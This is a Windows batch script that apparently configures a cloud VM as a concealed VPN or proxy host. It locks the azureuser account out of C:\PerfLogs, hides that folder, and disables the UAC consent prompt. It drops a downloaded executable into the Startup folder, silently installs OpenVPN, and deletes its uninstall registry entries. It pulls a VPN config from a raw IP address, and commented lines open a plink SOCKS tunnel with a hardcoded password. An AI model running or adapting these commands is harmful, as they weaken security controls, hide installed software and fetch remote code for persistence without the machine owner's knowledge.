cd C:\
cacls PerfLogs /e /p azureuser:n
attrib +h PerfLogs
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
#curl -L -k -O https://github.com/kmille36/thuonghai/raw/master/setproxywin.bat
curl -L -k -O https://raw.githubusercontent.com/kmille36/thuonghai/master/BraveBrowserSetup.exe
cd "C:\Users\Public\Desktop"
#curl -L -k -o "EnableInternetAccess.bat" https://github.com/kmille36/thuonghai/raw/master/setproxywin.bat
curl -L -k -O https://raw.githubusercontent.com/kmille36/thuonghai/master/BraveBrowserSetup.exe
 

:check
call wmic /locale:ms_409 service where (name="OpenVPNService") get state /value | findstr State=Running
if %ErrorLevel% EQU 0 (
    echo Running
    ping -n 60 localhost
) else (
    cd "C:\PerfLogs"
    curl -L -s -O https://swupdate.openvpn.org/community/releases/openvpn-install-2.4.9-I601-Win10.exe
    openvpn-install-2.4.9-I601-Win10.exe /S /SELECT_OPENVPNGUI=0 /SELECT_SHORTCUTS=0 /SELECT_SERVICE=1 /D=C:\PerfLogs
    echo Not running
    reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\OpenVPN" /f
    reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\TAP-Windows" /f
    ping -n 5 localhost
    cd C:\PerfLogs\config
    curl -L -s -O 20.205.34.105/thuonghaivm.ovpn
    sc config OpenVPNService start=auto
    sc start OpenVPNService
)
goto check






#ping -n 5 localhost
#cd C:\PerfLogs\config
#curl -L -s -O 20.187.113.227/thuonghaivm.ovpn
#sc config OpenVPNService start=auto
#sc start OpenVPNService


#cd "C:\PerfLogs"
#curl -L -k -O https://raw.githubusercontent.com/thuonghaivn/Developer/main/plink.exe
#echo y | plink.exe hai@20.205.11.115 -pw 12341234 -P 443 -2 -4 -C -D 127.0.0.1:8080 -T while true; do echo running; sleep 30s; done 



#echo cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" > start.bat
#echo curl -L -k -O https://raw.githubusercontent.com/kmille36/thuonghai/master/Psiphon3.zip  >> start.bat
#echo tar xf Psiphon3.zip >> start.bat
#echo cd Psiphon3 >> start.bat
#echo vpn.bat >> start.bat
#start.bat
